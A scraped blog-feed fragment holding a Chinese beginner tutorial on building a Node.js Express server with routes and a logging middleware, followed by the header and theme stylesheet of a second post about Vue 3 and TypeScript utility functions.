#4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="darcula">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#bababa}.hljs-emphasis,.hljs-strong{color:#a8a8a2}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#6896ba}.hljs-code,.hljs-selector-class{color:#a6e22e}.hljs-emphasis{font-style:italic}.hljs-attribute,.hljs-keyword,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-variable{color:#cb7832}.hljs-params{color:#b9b9b9}.hljs-string{color:#6a8759}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-subst,.hljs-symbol,.hljs-template-tag,.hljs-template-variable,.hljs-type{color:#e0c46c}.hljs-comment,.hljs-deletion,.hljs-meta{color:#7f7f7f}</style><p>还记得我第一次用Node.js写后端时的窘境：想处理一个简单的GET请求，翻了半天文档才凑出几十行代码，还因为没处理好请求头报了一堆错。直到前辈扔给我一句"试试Express"，我才发现后端开发原来能这么省心。这个在Node.js生态里活跃了十几年的"老伙计"，至今仍是数百万开发者的入门首选——不是因为它多新潮，而是因为它把复杂的Web开发逻辑，梳理得像奶茶里的珍珠一样清晰。</p>
<h2 data-id="heading-0">先搞懂：Express到底是什么？</h2>
<p>如果把Node.js比作一辆能跑的汽车，那Express就是一套现成的操控系统。它是基于Node.js的轻量级Web框架，没有给汽车换引擎，只是把方向盘、油门、刹车都设计得顺手又好懂。你不用再从零搭建HTTP服务器，不用手动解析请求参数，这些重复又繁琐的工作，Express都帮你封装成了简单的API。</p>
<p>有人说它是"Node.js的事实标准框架"，这话一点不夸张。GitHub上43k+的星标，每周超1000万次的npm下载量，还有StackOverflow上百万条相关问题，都证明了它的地位。就像Postman的早期原型、很多小程序的后端接口，都是用它搭起来的。它就像编程界的"白衬衫"，看似普通却百搭实用，不管是小demo还是中型系统都能hold住。</p>
<p>但它也不是完美的——版本更新慢，v4从2014年用到现在，v5的正式版迟迟不见踪影；面对Fastify这些后起之秀，性能也显得有些吃力。可就像老手艺一样，它的稳定、资料多、入门门槛低，仍是新手绕不开的选择。</p>
<h2 data-id="heading-1">上手实操：从"Hello World"开始</h2>
<p>别被"框架"两个字吓到，用Express写第一个程序，比泡一杯速溶咖啡还简单。前提是你已经装好了Node.js，接下来跟着步骤走，5分钟就能看到成果。</p>
<h3 data-id="heading-2">第一步：搭建项目环境</h3>
<p>先在电脑上建个文件夹，比如叫"my-first-express"，然后打开终端进入这个文件夹。依次输入下面两条命令：</p>
<pre><code class="hljs language-csharp" lang="csharp">npm <span class="hljs-keyword">init</span> -y  <span class="hljs-meta"># 初始化项目，生成package.json文件</span>
npm install express  <span class="hljs-meta"># 安装Express框架</span>
</code></pre>
<p>第一条命令会帮你创建项目配置文件，"-y"表示全部用默认设置，不用挨个确认；第二条命令则是把Express下载到项目里，就像给手机装APP一样。</p>
<h3 data-id="heading-3">第二步：写核心代码</h3>
<p>在文件夹里新建一个叫"app.js"的文件，这就是我们的核心代码文件。把下面这段代码复制进去，我会逐行给你解释：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 把Express框架"请"进来</span>
<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>)
<span class="hljs-comment">// 2. 创建一个Express应用实例，就像打开了一个服务窗口</span>
<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()
<span class="hljs-comment">// 3. 定义服务器要监听的端口，3000是开发常用端口</span>
<span class="hljs-keyword">const</span> port = <span class="hljs-number">3000</span>

<span class="hljs-comment">// 4. 定义路由：当有人访问根路径"/"时，返回"Hello World!"</span>
app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">'Hello World! 这是我的第一个Express应用'</span>)
})

<span class="hljs-comment">// 5. 启动服务器，开始监听3000端口</span>
app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`服务器跑起来啦！访问地址：http://localhost:<span class="hljs-subst">${port}</span>`</span>)
})
</code></pre>
<p>这里的关键是"路由"——它就像餐厅里的点餐系统，客人点了鱼香肉丝（访问"/"路径），厨房就按菜单做对应的菜（返回指定内容）。req是客人的需求（请求信息），res是厨房的回应（响应内容），通过这两个对象就能完成前后端的对话。</p>
<h3 data-id="heading-4">第三步：启动服务，见证成果</h3>
<p>在终端输入这条命令：</p>
<pre><code class="hljs">node app.js
</code></pre>
<p>如果看到"服务器跑起来啦！"的提示，就说明成功了。现在打开浏览器，输入"<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000" target="_blank" title="http://localhost:3000" ref="nofollow noopener noreferrer">http://localhost:3000</a>" ，页面上会清晰地显示我们写的那句话。是不是比直接用Node.js原生代码简单太多？</p>
<p>对了，要是想改响应内容，直接修改res.send()里的字符串就行；想停止服务，在终端按Ctrl+C就好。</p>
<h2 data-id="heading-5">核心技能：搞懂路由和中间件</h2>
<p>学会Hello World只是刚进门，Express的灵魂其实是路由和中间件。掌握这两个东西，你就能搭建真正能用的后端服务了。</p>
<h3 data-id="heading-6">1. 路由：给不同请求分好工</h3>
<p>实际开发中，我们不可能只有一个根路径。比如做一个博客，需要有文章列表、文章详情、提交评论等功能，这就需要定义多个路由。</p>
<p>在app.js里继续添加这些代码，就能实现不同路径的访问：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 文章列表页面，GET请求</span>
app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/articles'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">'这是文章列表，有10篇文章'</span>)
})

<span class="hljs-comment">// 单篇文章详情，路径里的:id是动态参数</span>
app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/articles/:id'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-comment">// 通过req.params获取动态参数</span>
  <span class="hljs-keyword">const</span> articleId = req.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`这是第<span class="hljs-subst">${articleId}</span>篇文章的详情`</span>)
})

<span class="hljs-comment">// 提交评论，POST请求</span>
app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/comments'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">'评论提交成功！'</span>)
})
</code></pre>
<p>现在访问"<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000%2Farticles%2F5" target="_blank" title="http://localhost:3000/articles/5" ref="nofollow noopener noreferrer">http://localhost:3000/articles/5</a>" ，会显示"这是第5篇文章的详情"；访问"/articles"会显示文章列表。这里要注意，路由匹配是按顺序来的，要是把动态路由写在固定路由前面，可能会出现匹配错误，这点一定要记牢。</p>
<p>如果路由太多，都堆在app.js里会很乱。这时候可以用express.Router()做模块化拆分，把路由单独放在一个文件里，就像把不同科目笔记分开记一样，清晰又好维护。</p>
<h3 data-id="heading-7">2. 中间件：请求的"中转站"</h3>
<p>中间件是Express最精妙的设计，我更愿意叫它"请求的加工厂"。比如污水处理需要过滤、沉淀、消毒三个步骤，中间件就是处理请求的这些步骤——在请求到达最终路由前，先做一些预处理，比如验证登录、记录日志、解析参数等。</p>
<p>举个简单的例子，我们做一个日志中间件，记录每次请求的时间和路径：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 定义日志中间件</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">logger</span> = (<span class="hljs-params">req, res, next</span>) =&gt; {
  <span class="hljs-keyword">const</span> time = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toLocaleString</span>()
  <span class="hljs-keyword">const</span> path = req.<span class="hljs-property">path</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${time}</span>] 有人访问了：<span class="hljs-subst">${path}</span>`</span>)
  <span class="hljs-comment">// 必须调用next()，否则请求会卡在中间件里</span>
  <span class="hljs-title function_">next</span>()
}

<span class="hljs-comment">// 注册全局中间件，所有请求都会经过它</span>
app.<span class="hljs-title function_">use</span>(logger)
</code></pre>
<p>把这段代码放在路由定义之前，再启动服务访问任意路径，终端就会显示访问时间和路径。这里的next()特别重要，就像接力赛的交接棒，把请求传递给下一个中间件或路由，要是忘了写，请求就会"迷路"。</p>
<p>中间件还能做很多事，比如身份验证——只有登录的用户才能访问某些路由。不过这里有个坑：要是把中间件挂载在根路径"/"，它会作用于所有请求，可能导致访问首页都需要登录。解决办法是给路由分个专属路径，比如把需要验证的路由都放在"/admin"下面，只给这个路径挂载验证中间件。</p>
<h2 data-id="heading-8">最后：Express的学习路径</h2>
<p>如果你刚入门，不用急着追求复杂功能，按这个步骤学就好：</p>
<ol>
<li>先掌握基础路由（GET/POST）和res的常用方法（send/json/render）；</li>
<li>学习中间件的使用，比如解析JSON请求体的express.json()、处理静态文件的express.static()；</li>
<li>尝试路由模块化，把代码拆分成不同文件；</li>
<li>结合数据库（比如MongoDB），实现数据的增删改查；</li>
<li>最后学习错误处理，让你的服务更健壮。</li>
</ol>
<p>Express就像一位话不多但经验丰富的老师傅，它不会强迫你用某种固定模式，而是给你足够的自由去发挥。虽然现在有Fastify、Koa这些更现代的框架，但把Express学扎实，就像打好编程的地基，以后再学其他框架会轻松很多。</p>
<p>别再犹豫了，打开终端，敲下那行npm install express，开启你的后端开发之旅吧。毕竟，最好的学习方式，就是动手去做。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue3+ts 封装一个通用流程复用工具函数]]></title>    <link>https://juejin.cn/post/7575458028255166507</link>    <guid>https://juejin.cn/post/7575458028255166507</guid>    <pubDate>2025-11-23T16:01:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575458028255166507" data-draft-id="7565324922907852835" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue3+ts 封装一个通用流程复用工具函数"/> <meta itemprop="keywords" content="前端,Vue.js,设计"/> <meta itemprop="datePublished" content="2025-11-23T16:01:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="inCBle"/> <meta itemprop="url" content="https://juejin.cn/user/2313807346271560"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue3+ts 封装一个通用流程复用工具函数
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2313807346271560/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    inCBle
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T16:01:50.000Z" title="Sun Nov 23 2025 16:01:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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